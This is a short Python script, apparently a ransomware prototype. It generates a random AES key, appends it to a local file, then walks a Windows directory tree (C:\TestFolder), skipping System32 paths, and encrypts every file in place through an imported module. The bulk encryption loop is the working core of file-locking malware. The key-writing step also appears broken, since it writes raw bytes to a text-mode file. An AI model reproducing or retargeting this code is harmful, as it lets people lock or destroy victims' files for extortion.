import os

from Crypto import Random

import AES_realisation


def generate_random__key():
    return Random.get_random_bytes(32)


def main():
    password = generate_random__key()
    with open("shaKeys", "a") as passwordFile:
        passwordFile.write(password)

    for root, dirs, files in os.walk("C:\\TestFolder", topdown=True):
        if (str(root).__contains__("System32")):
            continue
        else:
            for fileName in files:
                file_path = root + "\\" + fileName
                AES_realisation.encrypt(password, file_path)


if __name__ == "__main__":
    main()
